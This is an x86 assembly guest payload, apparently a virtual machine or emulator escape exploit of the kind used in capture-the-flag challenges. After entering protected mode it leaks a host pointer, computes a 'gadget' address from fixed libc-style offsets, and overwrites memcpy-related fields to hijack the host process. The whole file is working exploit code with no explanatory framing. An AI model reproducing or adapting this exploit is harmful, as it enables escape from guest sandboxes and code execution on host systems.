org 0
cli                     

lgdt [gdt_descriptor]   

mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain

%rep 50
db 0x00
%endrep

[bits 32]
PModeMain:
    mov ax, 0x10       
    mov ds, ax         
    mov ebp, 0x7c00    
    mov esp, ebp

    mov ebx, [0x7100]
    add ebx, 0x1b48
    sub ebx, 0x603000
    mov edx, [ebx]		
    sub edx, 0x3c51a8	
    add edx, 0x4527a	; gadget addr
    
    push edx
    
    mov ebx, [0x7100]
    add ebx, 0x27e0		; target &nbytes addr
    add ebx, 0x8
    sub ebx, 0x603000	; memcpy arg1

    pop edx
    mov [ebx], edx

    mov ecx, 0x602020
    mov [0x7100],ecx        ; memcpy arg1 -> 0x602020

    hlt

gdt_start:
gdt_null:
    dd 0
    dd 0
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
gdt_descriptor:
dw gdt_end - gdt_start - 1 
dd gdt_start